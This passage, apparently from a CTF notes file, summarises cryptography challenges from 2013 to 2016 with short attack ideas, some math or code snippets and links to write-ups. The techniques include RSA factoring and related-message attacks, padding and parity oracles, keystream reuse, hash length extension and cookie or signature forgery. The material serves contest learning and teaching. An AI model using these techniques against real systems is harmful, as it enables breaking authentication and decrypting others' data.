    if you know one part of the plain text, you are able to calculate the other one

### cryptomatv2 - csaw-ctf-2013
    sqli via aes-128-cbc
    we can recover the IV that the webapp uses for aes-128-cbc because we can use the app to encrypt
    a message with our key and download the ciphertext
    encrypt a plaintext "abcdabcdabcdabcdabcdabcdabcdabcd" with a key "abcdabcdabcdabcd" via the webapp
    returned ciphertext: mq8jyy5npsr3t1DR/33B4ZlY304+NOCGLXGp7stWcKk=
    decrypt it with key "abcd" and a zero IV gives us the plaintext: Y Q"S30PYR4]XZ- abcdabcdabcd
    XOR the first 16 bytes with "abcdabcdabcdabcd" gives the IV: 8k2F2QS480W998Nm
    http://blog.dragonsector.pl/2013/09/csaw-ctf-quals-2013-cryptomatv2-web-4002.html

### csawpad - csaw-ctf-2013
    stream cipher, same pad was used for all the ciphertexts (i.e. not a one-time pad at all!)
    guess the pad by trying to decrypt the first byte of each known ciphertext with 0-255 and
    discard candidate when decrypted byte not in charset
    then bruteforce the rest of the pad
    http://delogrand.blogspot.com.au/2013/09/csaw-quals-2013-csawpad-cryptography-100.html

### otp - 31c3-ctf-2014
    meet in the middle to forge valid otp
    precompute 3-byte hashes bytes and try to find a match when creating 4 byte hashes
    https://github.com/ctfs/write-ups-2014/tree/master/31c3-ctf-2014/crypto/otp

### sso - 31c3-ctf-2014
    forge cookie because stream cipher without random iv
    https://github.com/ctfs/write-ups-2014/tree/master/31c3-ctf-2014/crypto/sso

### hwaes - 31c3-ctf-2014
    aes key expansion
    we provide an aes key, server encrypts our data, then changes the aes key
    we can recover the original master from the derived key
    https://github.com/ctfs/write-ups-2014/tree/master/31c3-ctf-2014/crypto/hwaes

### simple login - secuinside-ctf-quals-2014
    hash length extension with crc32

### archaic - asis-ctf-quals-2014
    break merkle-hellman cryptosystem using LLL lattice reduction algo
    https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/archaic

### decrypt-img - boston-key-party-2014
    bmp encrypted with 56-byte key
    bmp header is 54-byte so we can recover the key by xoring the first 54 bytes of the encrypted bmp
    https://hexpresso.wordpress.com/2014/03/02/bkp-ctf-decrypt-img-write-up/

### xorxes - boston-key-party-2014
    hash collision due to using xor and bit shifting
    https://ctfcrew.org/writeup/29

### mitm_ii - boston-key-party-2014
    mitm attack with pubkey exchange

### differential power - boston-key-party-2014
    tea cipher
    used z3 to recover key
    http://mslc.ctf.su/wp/boston-key-party-ctf-differential-power-crypto-400/

### psifer_school - csaw-ctf-2014
    caesar, scytale and vigenere

### crypto100 - confidence-ctf-teaser-2014
    lotto with big bias on validation code (random salt) so we can map numbers to round uuids and
    only play when we can win for sure

### crypt400 - defkthon-ctf-2014
    solve simple maths using fermat's little theorem
    http://blog.0xdeffbeef.com/2014/03/defkthon-ctf-2014-find-flag-crypto-400.html

### pillowtalk - ghost-in-the-shellcode-2014
    keystream reuse (stream cipher)
    https://github.com/ctfs/write-ups-2014/tree/master/ghost-in-the-shellcode-2014/pillowtalk

### wiener - hacklu-ctf-2014
    rsa wiener
    https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/wiener

### douchemac - hacklu-ctf-2014
    dbus and bypass CBC-MAC hmac authentication
    https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/douchemac

### peace pipe - hacklu-ctf-2014
    mitm with pubkey' = -pubkey % p
    https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/peace-pipe

### cryptonet - hackyou-2014
    we have a lot of flags encrypted with the same e=17, but with different modulos
    encflag1 = (flag^17) % n1, encflag2 = (flag^17) % n2, etc. we can find flag^17 using the CRT
    and recover flag by calculating its 17th root
    http://www.pwntester.com/blog/2014/01/17/hackyou2014-crypto400-write-up/

### easy one - hackyou-2014
    crypto maison
    recover key because we have plaintext & ciphertext
    http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto100-write-up/

### hashme - hackyou-2014
    recover key via xor(plaintext, ciphertext), hash length extension and parameter pollution
    http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto200-write-up/

### matrix - hackyou-2014
    4x4 matrix encryption system
    reversible using inverse matrixes
    we can recover key K because:
    E = P * K then P.I * E = P.I * P * K so K = P.I * E (P.I is the inverse of P)
    encrypted file is a WMV video, so we can use the 16-byte magic number to recover the key
    http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto300-write-up/

### mic - olympic-ctf-2014
    chinese remainder
    we send to server prime p and base g
    server sends pow(g*flag, flag, p) * flag + flag mod p
    we can get rid of powered flag by sending p-g
    https://github.com/ctfs/write-ups-2014/tree/master/olympic-ctf-2014/mic

### mars - phd-ctf-quals-2014
    client sends n1 to server
    server sends n2 to client
    client sends c1 to server
    server sends c2 to client
    gcd = egcd(n1, n2)[0]
    p = n1 / gcd
    p2 = n2 / gcd
    lets assume plaintext message m is a number < p (i.e. it was not padded)
    so pow(m, e, n) % p == pow(m, e, p) and d = invmod(e, phy(p)) and p is prime so phy(p) == p-1
    we recover d = invmod(0x010001, p-1) and m = pow(c, d, p)
    http://blog.ptsecurity.com/2014/05/phdays-ctf-quals-tasks-analysis.html

### wheeeee - plaid-ctf-2014
    encryption oracle, slide attack
    slide attack: https://fail0verflow.com/blog/2014/plaidctf2014-crypto375-wheeeee.html

### tls - ructf-2014-quals
    decrypt tls because client uses non-random number generator (always returns 1337)
    we recover the client secret exponent from diffie-hellman key exchange
    we compute Pre-Master Secret and then the Master Secret as PRF for wireshark
    http://blog.dragonsector.pl/2014/03/ructf-2014-quals-tls-crypto-300.html

### crypto100 - volga-ctf-quals-2014
    ciphertext is a big number, we have an encryption oracle, each letter is assigned a number and
    an exponent depending on its position
    they are all multiplied together to produce the ciphertext
    need to factorize the ciphertext to find which letters were used
    https://github.com/ctfs/write-ups-2014/tree/master/volga-quals-2014/crypto/100

### another one - nuitduhack-ctf-quals-2014
    encrypted bmp in ecb mode, assume all identical 16-byte blocks are white pixels, anything else
    is black pixels
    https://doegox.github.io/ElectronicColoringBook/

### twenty - plaid-ctf-2014
    vigenere cracked using hill climbing

### rsa - plaid-ctf-2014
    partially masked RSA private key (paper/tools can recover it as long as 27% of bits are known)
    https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/rsa

### parlor - plaid-ctf-2014
    md5 hash length extension attack
    https://fail0verflow.com/blog/2014/plaidctf2014-crypto250-parlor.html

### rsaha - hitcon-ctf-2014
    Franklin-Reiter Related Message attack
    the 2 plaintexts only differ by a known fixed difference allowing their ciphertext to be decrypted
    server sends: n, m^3 % n and (m+1)^3 % n
    we can recover m with: ((m+1)^3 + 2*m^3 - 1) / ((m+1)^3 - m^3 + 2) = m mod n
    http://pastie.org/9482057
        f = (m+1)^3 + 2*m^3 - 1 % n
        g = (m+1)^3 - m^3 + 2 % n
        m = (f * gmpy.invert(g, n)) % n
    http://pastebin.com/4SQhQXHb
        <ricky> You're given m^3 and (m+1)^3 = m^3 + 3m^2 + 3m + 1
        <ricky> From this you can compute m^2 + m + 1
        <ricky> m^3 - 1 = (m - 1)(m^2 + m + 1)

### emdee - olympic-ctf-2014
    md5(salt + input + timestamp)
    %7f deletes previous salt chars so we can recover salt
    http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/#curling300emdee

### rsa-mistakes-200 - pico-ctf-2014
    two messages related to each other (i.e. have almost the same
    content (specifically content := unique-prefix + flag) , encrypted by the same public key
    https://github.com/ctfs/write-ups-2014/tree/master/pico-ctf-2014/master-challenge/rsa-mistakes-200

### block - pico-ctf-2014
    meet in the middle to recover the 2 keys used in a substituion-permutation cryptosystem
    https://ehsandev.com/pico2014/cryptography/block.html

### substitution - pico-ctf-2014
    break substitution cipher
    https://ehsandev.com/pico2014/cryptography/substitution.html

### revenge - pico-ctf-2014
    forge rsa signature
    https://ehsandev.com/pico2014/cryptography/revenge.html

### ecc - pico-ctf-2014
    y^2 = x^3 + a(x) + b mod n
    we have C (X, Y), a, and n but not b
    we recover b then decrypt C
    https://ehsandev.com/pico2014/cryptography/ecc.html

### related - ructf-2014-quals
    Franklin-Reiter Related Message attack
    we have c1 and c2 (m1 = m.'Jane', m2 = m.'Alex')
    m^e - c1 = 0 mod n and (m+delta)^e - c2 = 0 mod n with delta=s2int("Jane")-s2int("Alex") and def s2int(x): int(x.encode("hex"), 16)
    get gcd(m^e - c1, (m+delta)^e - c2) => x-d1 (x=(m+delta) and d1 is a decrypted c1)

### decrypt it - seccon-ctf-2014
    encrypted file is xored with rand() seeded with the file's timestamp
    then rabin asymetric cryptosystem
    2 solutions: bruteforce or Chinese remainder theorem

### wtc rsa bbq - tinyctf-2014
    twin primes, modulus very close to a power of 2
    we can start factoring from the square root of the modulus
    https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/wtc-rsa-bbq

<!-- }}} -->
<!-- 2015 {{{ -->
</p></details><details><summary>2015</summary><p>

### old cryptography - 0ctf-2015
    poly-alphabetic substitution with a non-uniform shift
    https://b01lers.net/challenges/0ctf/Old%20cryptography/39/

### rsaquine - 0ctf-2015
    rsa chinese-reminder nopadding msieve
    need to find m so m^e = m % p and m^e = m % q
    and m^(e - 1) = 1 % p (same applies for q hereafter)
    we find g a generator so g^k != 1 % p for 0<k<p-1
    and g^(k*(p-1)) = 1 % p for all k>=0
    for each m with 0<m<p there exists a x so that m = g^x % p
    so we need to find x such that g^(x*(e-1)) = 1 % p
    the solutions are solutions of the equation k*(p-1) = x*(e-1)
    http://tasteless.eu/post/2015/03/0ctf-2015-rsaquine/

### rsasr - asis-finals-ctf-2015
    emirp, sqrt(N) has 155 digits so we need to figure out 77 digits on each side
    https://github.com/ctfs/write-ups-2015/tree/master/asis-finals-ctf-2015/crypto/RSASR

### honeywwall - asis-finals-ctf-2015
    egcd, we have c = msg_0^e %N_0 and c2 = msg_0^e2 % N_0 (flag is msg_0)
    we find x and y such that xe + ye2 = 1
    we recover msg_0 with c^x * c2^y % N_0
    because msg_0^(xe) * msg_0^(ye2) % N_0 = msg_0^(xe+ye2) % N_0 = msg_0 % N_0 = msg_0
    https://kt.pe/blog/2015/10/asis-2015-finals-honeywall/

### giloph - asis-finals-ctf-2015
    diffie-hellman with pohlig-hellman attack due to smooth p-1 that can be factored into small factors
    http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-giloph-crypto-300/

### sed - asis-finals-ctf-2015
    DES with 10 different keys Ek10=keys[10](Ek9=keys[9](Ek8...
    and bruteforce k1 & k2 so that Ek1(Ek2(plain)) = plain
    http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-10-sed-crypto-175/

### angler - asis-quals-ctf-2015
    simple permutation cipher with a key of 13
    https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/angler

### falsecrypt - asis-quals-ctf-2015
    NTRU publickey cryptosystem that cant be broken by Shor's algorithm
    https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/falsecrypt

### golden metal - asis-quals-ctf-2015
    Goldwasser-Micali cryptosystem solved with msieve factorization
    https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/golden-metal

### cross check - asis-quals-ctf-2015
    p very close from q, use fermat  to recover factors
    a = fermat(N, N1, N2) with N = N1 * N2 = p1*q1*p2*q2
    then p1 = gcd(N1, a) and q1 = N1 / p1
    https://b01lers.net/challenges/ASIS%202015/Cross%20Check/52/

### rsanne - backdoor-ctf-2015
    modulus consists of 2281 1s followed by 2203 0s, allowing factorization: (2^2281 - 1)(2^2203 - 1)

### rsalot - backdoor-ctf-2015
    100 public keys and an RSA-encrypted flag file
    two keys must have a moduli n with a common prime factor (can be p or q but it was p in this task)
    we find the two keys where n1 = p*q1 and n2 = p*q2 (or n1 = p1*q or n2 = p2*q)
    we can then easily factor n1 and n2 by calculating the gcd of n1 and n2: gcd(n1, n2) = p (see gcd.py)
    then use rsatool.py -p .. -q .. -o private.pem and openssl rsautl ...

### weak_enc - bctf-2015
    lzm compression before encryption = side-channel attack
    server encrypts our input as lzm(salt||$input), we can deduce chars in salt by looking at length of ciphertext
    first submit empty empty input to have the length of compressed salt
    then submit every bigrams to server to find what bigrams are in salt, then do same for trigrams, quadgrams etc. until the first n-gram doesnt yield any new info
    once we have a set of n-grams comprising the salt, we try every combination offline to match the null ciphertext
    once we have reovered salt, we decrypt target ciphertext by constructing a reverse LSW dictionary
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BCTF/crypto/weak_enc

### warmup - bctf-2015
    rsa wiener
    https://github.com/ctfs/write-ups-2015/tree/master/bctf-2015/crypto/warmup

### wood island - boston-key-party-2015
    el gamal signature, provided sigs with r reused we can recover private key
    https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/crypto/wood-island
    had also an unintended way
    server used the python json library to decode the string into a dict and the
    is_duplicate() check was a simple “user_dict in list” so adding a field to the
    json was enough to pass the check.

### orient heights - boston-key-party-2015
    same as wood island is_duplicate() just compared the binary ASN1 encoding; so
    again adding a field caused it to fail
    https://r3dey3.com/2015-03/bkpctf-wood-island-and-orient-heights/

### wonderland - boston-key-party-2015
    elliptic curve discrete logarithm problem solved using a twist attack on a Montgomery ladder
    and apply Chinese Remainder Theorem to recover the key
    the actual attack, then, uses a variation of Pollard's Rho algorithm to compute the discrete logarithms
    https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/crypto/wonderland

### bowdoin - boston-key-party-2015
    partially masked RSA private key (partial p & q)
    http://gnoobz.com/bkpctf-2015-bowdoin-writeup.html

### airport - boston-key-party-2015
    timing oracle, modular exponentiation, square-and-multiply
    https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/crypto/airport

### good crypto - codegate-ctf-2015
    flag is the passphrase that was converted into the wep key
    wep uses a LCG (linear congruental generator) prng, seed is generated from the passphrase
    and the wep key is generated by using the 3rd byte of the 5 first numbers from the lcg prng
    https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/programming/good-crypto

### rsaq - pragyan-ctf-2016
    same as rsalot but q is the common prime factor

### haunted 1's - pragyan-ctf-2015
    ciphertext only consists of 0s or digits in the 2-9 range
    replace everything that is not 0 with 1, binary becomes ascii

### substitution - pragyan-ctf-2015
    we are given the start of the key ("prgyan"), decipher msg with:
    'dhkuagsn'.translate(string.maketrans("prgyanbcdefhijklmoqstuvwxz", "abcdefghijklmnopqrstuvwxyz"))

### weak rsa - pragyan-ctf-2015
    twin primes, pubkey can be factorized using fermats -> p & q recovered
    rsatool.py takes p & q to create privatekey.pem
    openssl rsautl -in ct.bin -inkey privatekey.pem -decrypt -raw to decrypt message

### substitution - breakin-ctf-2015
    https://github.com/ctfs/write-ups-2015/tree/master/break-in-ctf-2015/crypto/substitution

### ts-sci-nz - bsides-vancouver-ctf-2015
    keypad cipher
    https://github.com/ctfs/write-ups-2015/tree/master/bsides-vancouver-ctf-2015/crypto/ts-sci-nz

### salt - hacklu-ctf-2015
    Box NaCl using Curve25519, Poly1305 (for signing) and XSalsa20 (for encrypting) which is simple XOR
    we recover text with (text XOR key) XOR (known_text XOR key) XOR (known_text) => text XOR (known_text XOR known_text) XOR (key XOR key) => text XOR 1 XOR 1 => text
    https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/crypto/salt

### id love to turn you on - hackcon-2015
    decrypt using online enigma machine
    http://vimvaders.github.io/hackcon2015/2015/08/20/id-love-to-turn-you-on.html

### rsabin - hitcon-ctf-quals-2015
    flag size bigger than modulus, we need to bruteforce 22 lost bits (feasible because flag only contains printable chars)
    exponent is not invertible so we use the pseudoinverse and the Eli Bendersky's modular_sqrt function to compute 16th roots of c**d
    https://ctftime.org/task/1753

### poooooooow - hitcon-ctf-quals-2015
    submit x to server with 0<x<p, server returns x^flag % p
    best algo to compute discrete logarithm in a group requires more than O(sqrt(q)) time where q is the largest prime factor of the order of the base number
    here it would be too slow because
    p-1 = 2 * 3^336 * q (with q = 475...41 way too big)
    but 2 is a primitive root modulo p, so x = 2^q has order 2*3^336 which is long enough for the flag (which is 50 characters) and only has small prime factors
    so we send x = 2^q to server, server returns y and we can solve with Sage:
    p, y = .., ..
    x = 2**q
    print 'flag is:', long_to_bytes(discrete_log(Mod(y, p), Mod(x, p)))

### simple - hitcon-ctf-quals-2015
    aes cfb forge {"admin":true} by xoring first encrypted block with known plaintext: '{"username":"b",' and discard the other blocks
    http://nusgreyhats.org/write-ups/HITCONCTF-Quals-2015-Simple-(Crypto-100)/ https://ctftime.org/task/1754

### agents - icectf-2015
    rsa broadcast attack but with plaintext bigger than any agent's modulus
    need to gather more keys and ciphertexts to have CRT recover the plaintext
    http://blog.atx.name/icectf/#Agents

### alicegame - mma-ctf-2015
    elgamal encryption service
    server sends c1 = g^h % p and c2 = m * h^r % p so we send m=1 and r=1 to recover g and h then send m=-1 and r=1 to recover p because c2 = p - h
    poll service untill we get a smooth p-1 so we can compute the discrete log via Pohlig-Hellman
    https://github.com/pwning/public-writeup/blob/master/mma2015/crypto250-alicegame/writeup.md

### LCGSign - mma-ctf-2015
    two messages signed using DSA related to each other because the secret "random" was generated by a linear-congruential RNG (LCG)
    https://github.com/pwning/public-writeup/blob/master/mma2015/crypto400-lcgsign/writeup.md

### signer and verifier - mma-ctf-2015
    forge RSA signature because modular exponentiation distributes over modular multiplication
    server has 2 endpoints: signer and verifier
    we need to send the signature of the given msg to the verifier to get flag
    we cannot just ask the signer to sign the given msg obviously
    so we send send msg/divisor to signer to get sig0 and we send divisor to signer to get sig1
    and we now have forged the valid signature: sig0 * sig1 % n
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/MMACTF/crypto/signerverifier

### motto-mijkai-address - mma-ctf-2015
    exploit linearity of CRC: CRC(a^b^c) = CRC(a) ^ CRC(b) ^ CRC(c)
    exploit polynomial of HMAC
    https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/web/motto-mijkai-address-400

### curious - plaid-ctf-2015
    rsa wiener
    https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/crypto/curious

### strength - plaid-ctf-2015
    egcd, we have (N, e1, c1) and (N, e2, c2) such that gcd(e1, e2) = 1 then we can do egcd(e1, e2) = a1e1 + a2e2 = 1.
    c1^a1 * c2^a2 = (m^e1)^a1 * (m^e2)^a2 = m^(e1a1) * m^(e2a2) = m^(e1a1 + e2a2) = m^1 = m (all mod N)
    in this case a2 is negative so we have to find the modular multiplicative inverse of the corresponding
    ciphertext c2 and calculate b = (gcd(e1, e2)-(a*e1))/e2 so we can calculate c1^a1 * modinv(c2, N)^(-b) % N = m
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/PCTF/crypto/strength

### lazy - plaid-ctf-2015
    Merkle-Hallman knapsack cryptosystem
    use lattice and using LLL reduction
    http://gnoobz.com/plaid-ctf-2015-lazy-writeup.html

### crib drag - sCTF-2015
    one time pad used more than once (i.e. to encrypt 2 or more plaintexts)
    we can recover the plaintexts without knowing the key using the crib drab method

### crypto150 - tum-ctf-teaser-2015
    huge RSA private key (d has over four million bits)
    we can determine the factors of n given a pair (e, d) using Dan Boneh’s paper (http://www.ams.org/notices/199902/boneh.pdf)
    https://hxp.io/blog/20/TUMCTF%20Teaser%202015:%20crypto150%20%22really_slow_arithmetic%22%20writeup/

### cpkc - volga-ctf-quals-2015
    LLL-based attack on NTRUEncrypt-like cryptosystem
    we need to find small values, so we solve this using LLL algorithm
    http://mslc.ctf.su/wp/volgactf-quals-2015-cpkc-crypto-400-writeup/

### lcg - volga-ctf-quals-2015
    recover 3 successive outputs to clone the LCG PRNG
    LCGs aren't cryptographically secure PRNGs as the internal states and the initial state can be easily recovered from a series of 3 successive outputs
    we can see encrypt is a stream cipher that xors the plaintext with the
    continuous output of the LCG PRNG which is seeded with a randomly generated
    768-bit key. Both the challenge name and the fact that each PRNG state is
    defined as state[i+1] = (a*state[i] + b) mod m indicate that the PRNG is a
    linear congruential generator.
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/VOLGACTF/crypto/lcg/README.md

### rsa - volga-ctf-quals-2015
    rsa wiener (huge public exponent may mean small private exponent)
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/crypto/rsa

<!-- }}} -->
<!-- 2016 {{{ -->
</p></details><details><summary>2016</summary><p>

### collision course - backdoor-ctf-2016
    solve Merkle-Damgård-like hashing structure via bruteforce: test all x so that B0 == H(x) << 7
    then take the next block and solve (H(x) ^ B0) << 7 and so on
    https://github.com/ctfs/write-ups-2016/tree/master/backdoor-ctf-2016/crypto/collision-course-350

### forge - backdoor-ctf-2016
    part1: crc32 collisions, submit 5 pngs with identical pixels and the same crc32 as the provided png
    part2: md5 collisions, submit 8 files having the same MD5. Use fastcol https://marc-stevens.nl/research/
    https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_forge

### baby - backdoor-ctf-2016
    Bleicherbacher e=3 RSA attack against signature verification
    https://grocid.net/2016/06/05/backdoorctf16-baby/

### crc - backdoor-ctf-2016
    many encrypted zip files that uncompress to 5 byte files
    we can brute force each file contents because ZIPs contain CRC32 of their uncompressed files
    https://github.com/ctfs/write-ups-2016/tree/master/backdoor-ctf-2016/crypto/crc-250

### mindblown - backdoor-ctf-2016
    PBKDF2 + HMAC collision
    https://mathiasbynens.be/notes/pbkdf2-hmac http://rawsec.ml/en/writeups-crypto-mindblown/

### level0x3 - eff-ctf-2016
    one letter is "encrypted" into 4 numbers but the sum of all 4 numbers is always the same value

### level0x5 - eff-ctf-2016
    rsa public exponent very small (3)
    see small-exponent.py

### trivia300 - nullcon-hackim-2016
    Bill's Cipher (funky substituion cipher for kids) "Gravity Falls"

### crypto1 - nullcon-hackim-2016
    given ciphertext and cleartext, XOR both to get key and decrypt another ciphertext

### crypto5 - nullcon-hackim-2016
    given several public RSA keys and a ciphertext, python script
    interestingly, the ciphertext was encrypted using the private key
    in RSA, either key in a keypair can be used as the private or public component

### rail fence - su-ctf-2016
    see break_transposition_railfence.py

### zeus - su-ctf-2016
    encoding with hamming code and interleaved with helical scan matrix
    https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/crypto_300_zeus

### british elevator - su-ctf-2016
    elliptic curves
    http://hxp.io/blog/25/

### crypto pirat - internetwache-ctf-2016
    each symbol maps to a planet number -> German Stasi TAPIR decoding -> morse code
    https://losfuzzys.github.io/writeup/2016/02/21/iwctf2016-crypto-pirat/

### oh bob - internetwache-ctf-2016
    3 small pubkeys (228 bit) we can factor egcd (or yafu)
    https://www.xil.se/post/internetwache-2016-crypto60-kbeckmann/

### vigenere - pragyan-ctf-2016
    flag.txt: loi wtnk az cyhimzm8kka12mo (vigenere)
    found key using the "tabula recta" (http://practicalcryptography.com/ciphers/vigenere-gronsfeld-and-autokey-cipher/)
    loi wtnk az cyhimzm8kka12mo (vigenere)
    the flag is
    SHE RINE SH
    key was "SHERINE" and can be used to decrypt the rest

### a number's game - internetwache-ctf-2016
    use sympy to solve equations

### its prime time - internetwache-ctf-2016
    provided a number, find next prime (sympy works)

### hashdesigner - internetwache-ctf-2016
    find collision for custom hash

### eso-tape - internetwache-ctf-2016
    implement an interpreter for the TapeBagel esoteric language

### hmac crc - boston-key-party-2016
    rewrite inner CRC as a polynomial mod CRC_POLY so we can rewrite HMAC as a polynomial
    https://github.com/DeliciousHorse/2016.03.BostonKeyParty/blob/master/hmac_crc.md
    atl solution: hmac is linear
    when we flip one bit in key, all bits of the output depending on this bit also flip with no matter of other bits in key
    use gauss-jordan algorithm to compute which bits in key need to flip if I want flip one bit in signature at given position
    https://github.com/raccoons-team/ctf/tree/master/2016-03-07-boston-key-party-ctf/crypto_5_hmac_crc

### des ofb - boston-key-party-2016
    des in stream cipher mode with a weak key == keystream repetition

### bobs hat - boston-key-party-2016
    l1: rsa with p and q similar -> easy to factor 1024 modulus
    l2: 2 moduli with a common factor
    l3: q is small so we can easily factorize the modulus
    l4: wiener attack (huge exponent)

### ltseorg - boston-key-party-2016
    groestel hash collision
    quick win with 00 turning into padding (https://0day.work/boston-key-party-ctf-2016-writeups/#ltseorg)
    expected solution: https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BKPCTF/crypto/ltseorg

### more like zkp - boston-key-party-2016
    graph 3-coloring
    https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/crypto/more-like-zkp-4

### equation - 0ctf-2016
    recovering a partially masked RSA private key
    https://0day.work/0ctf-2016-quals-writeups/ https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/equation

### rsa? - 0ctf-2016
    modulus factored into 3 primes
    solve with gauss and wolframalpha and crt
    https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rsa

### special rsa - bctf-2016
    not rsa (it's the secret k that is powed, not m). We can recover k with egcd
    c = k^r * m mod N (we know c, r, m and N and we have 2 plaintexts and 2 ciphertexts with the same k)
    c1 = k^r1 * m1 mod N and c2 = k^r2 * m2 mod N
    k^r1 = c1 * m1^-1 mod N, k^r2 = c2 * m2^-1 mod N
    egcd(r1, r2) returns g, a, b with  (a * r1) + (b * r2) == 1
    (k^r1)^a * (k^r2)^b = k^(a*r1 + b*r2) = k^1 = k
    https://gist.github.com/elliptic-shiho/489804cd675ed11d7adb
    https://cryptsec.wordpress.com/2016/03/21/bctf-2016-write-up-special-rsa-crypto-200/ (sage script)

### one one zero - camctf-2016
    weak public key (330 bit) found on factordb.com
    chunks too small to be decrypted with openssl rsautl, so wrote decrypt-rsa.py

### xxy - volga-ctf-quals-2016
    breaking Goldreich-Goldwasser-Halevi lattice encryption
    http://hxp.io/blog/26/

### rabit - plaid-ctf-2016
    parity oracle - exploit least significant bit oracle using binary-search
    in malleable cryptosystems (like RSA or Rabin), the property exists:
    c = m^e % N
    y = x^e % N
    c' = (c*y) % N = (m^e % N)*(x^e % N) % N = (m^e * x^e) % N = (m*x)^e % N
    so we can arbitrarily multiply the plaintext, with Rabin if we multiply ciphertext by 4 we multiply plaintext by 2
    we send 4*CT (sqrt_mod(4*CT, N) = sqrt_mod(4, N)*sqrt_mod(CT, N) = 2*PT mod N), if lsb == 0 then 2*PT < N otherwise 2*PT > N
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/rabit

### sexec - plaid-ctf-2016
    attacking a small instance of Ring-LWE based cryptosystem with Babai’s Nearest Vector algorithm
    http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/

### radioactive - plaid-ctf-2016
    fault attack on RSA signature (not RSA-CRT)
    http://mslc.ctf.su/wp/plaidctf-2016-radioactive-crypto-275/

### tonnerre - plaid-ctf-2016
    break SRP via session secret fixation (g^2)
    https://github.com/ctfs/write-ups-2016/tree/master/plaidctf-2016/crypto/tonnerre-300

### spotted wobbegong - google-ctf-2016
    rsa pkcs1.5 padding oracle
    http://mslc.ctf.su/wp/google-ctf-spotted-wobbegong-crypto-100/

### woodman - google-ctf-2016
    PRNG consisting of two LCG combined with xor.
    http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/

### rsacalc - google-ctf-2016
    service supports basic arithmetic calculations modulo N
    recover N via 1/2 * 2 - 1 => N
    discover padding used is pkcs1.5 and exponent is 65537
    service supports sqrt, recover a prime factor via gcd(A-a', N) where A=a^2 % N with a=rand(2, N-1) and a'=sqrt(A) % N
    https://neg9.org/news/2016/5/4/google-ctf-2016-rsacalc-crypto-300-writeup

### little crypto gambler - ctfx-2016
    pseudorandom numbers generated using a Linear Congruential Generator
    several fast ways to crack them based on only a few outputs
    one way can be found here: http://security.stackexchange.com/a/4306
    bet 1 ~7 times and calculate the LCG parameters, then calculate the next number and bet everything
    https://github.com/bobacadodl/ctfx-problems/tree/master/crypto/little_crypto_gambler-150

### twin primes - tokyo-western-ctf-2016
    flag encrypted with 2 keys. key1 with modulus p*q. key2 with modulus (p+2)*(q+2)
    https://github.com/TeamContagion/CTF-Write-Ups/tree/master/TokyoWesterns-2016/Twin%20Primes
    or use sympy to automatically solve equation (related-moduli.py)

### dam - asis-ctf-2016
    generalized version of the Pallier cryptosystem: the Damgard–Jurik cryptosystem
    hoping server generates a key with a small prime factor
    https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/dam

### secuprim - asis-ctf-2016
    we need to provide the number of primes and perfect powers in a given range
    ranges are small so we can just iterate and use gmpy2.is_prime and gmpy2.is_power
    https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/secu_prim

### only9 - asis-ctf-2016
    encryption oracle with sbox + matrix and a 9 round key schedule
    solve with square attack:
    Pick an index i and 256 plaintexts P_k that all differ in byte i, but coincide
    in all indexes j != i. Then after 8 rounds, the i-th byte of the XOR of all
    ciphertexts C_k of P_k is 0. We can use this to mount a square attack
    The final ciphers after 9 rounds are C'_k = M*(SBOX(C_k)) ^ K where K is the
    last round key. This can be rewritten as C_k = SBOX^-1((M^-1 * C'_k) ^ (M^-1 * K))
    We can use the characteristic from above to brute force the i-th byte of
    M^-1 * K. Do this for all i to get K completely. Then reconstruct the original
    key from it by reversing the key schedule.
    https://github.com/kitctf/writeups/blob/master/asis-finals-2016/only9/solve.py

### races - asis-ctf-2016
    combination of ECC and RSA (ECRSA)
    flag encrypted with a lot of public keys, use gmpy2 to find two public rsa keys that share the same prime and factor them
    decrypt flag using the provided multiply function (implements Montgomery Ladder Scalar Multiplication on Elliptic Curve)
    https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/races
    http://blog.ankursundara.com/asis-ctf-finals-2016-races/

### srpp - asis-ctf-2016
    bypass SRP with A = 2*N
    https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/srpp

### dsa - asis-ctf-2016
    recover private key because k = (1..1024)*magic (only 1024 ks can possibly be generated)
